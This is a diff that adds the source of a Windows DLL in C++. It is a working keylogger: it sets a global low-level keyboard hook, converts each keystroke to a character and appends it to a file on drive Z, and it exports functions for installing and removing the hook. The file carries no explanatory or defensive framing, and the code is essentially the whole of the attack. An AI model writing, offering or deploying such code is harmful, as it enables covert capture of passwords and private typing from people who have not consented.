@@ -1,0 +1,77 @@
+#include <windows.h>
+
+
+HINSTANCE hInstance = NULL;
+HWND hLauncherWnd = NULL;
+UINT uiKeyboardMessage = WM_NULL;
+HHOOK hKeyboardHook = NULL;
+
+
+static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+	if (nCode == HC_ACTION && hLauncherWnd)
+	{
+		KBDLLHOOKSTRUCT * strct = (KBDLLHOOKSTRUCT *)lParam;
+		DWORD wVirtKey = strct->vkCode, wScanCode = strct->scanCode, dwTemp;
+		UINT ShiftKey = 16, Capital = 20;
+
+		if (wVirtKey == VK_ESCAPE) PostQuitMessage(0);
+
+		BYTE lpKeyState[256];
+		GetKeyboardState(lpKeyState);
+		lpKeyState[ShiftKey] = 0;
+		lpKeyState[Capital] = 0;
+		if (GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0)
+		{
+			lpKeyState[ShiftKey] = 0x80;
+		}
+		if (GetKeyState(VK_CAPITAL) == 1)
+		{
+			lpKeyState[Capital] = 0x01;
+		}
+
+		WCHAR result;
+		ToUnicode(wVirtKey, wScanCode, lpKeyState, (LPWSTR)&result, 1, 2);
+
+		HANDLE hFile = CreateFile(TEXT("Z:\\text.txt"), FILE_APPEND_DATA, FILE_SHARE_WRITE,
+			0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+		if (INVALID_HANDLE_VALUE == hFile)
+		{
+			return NULL;
+		}
+
+		WriteFile(hFile, &result, sizeof(result), &dwTemp, NULL);
+		CloseHandle(hFile);
+
+	}
+	return CallNextHookEx(0, nCode, wParam, lParam);
+	
+}
+
+extern "C" __declspec(dllexport) BOOL CALLBACK SetKeyboardHook()
+{
+	if (!hKeyboardHook)
+		hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hInstance, 0);
+	return hKeyboardHook ? TRUE : FALSE;
+}
+
+extern "C" __declspec(dllexport) VOID CALLBACK UnhookKeyboardHook()
+{
+	if (hKeyboardHook)
+		UnhookWindowsHookEx(hKeyboardHook);
+	hKeyboardHook = NULL;
+}
+
+BOOL WINAPI DllMain(HINSTANCE hDLL, DWORD dwReason, LPVOID lpvReserved)
+{
+	switch (dwReason)
+	{
+	case DLL_PROCESS_ATTACH:
+		hInstance = hDLL;
+		hLauncherWnd = FindWindow(TEXT("ClassName"), NULL);
+		uiKeyboardMessage = RegisterWindowMessage(TEXT("KeyboardHook"));
+		break;
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
+}
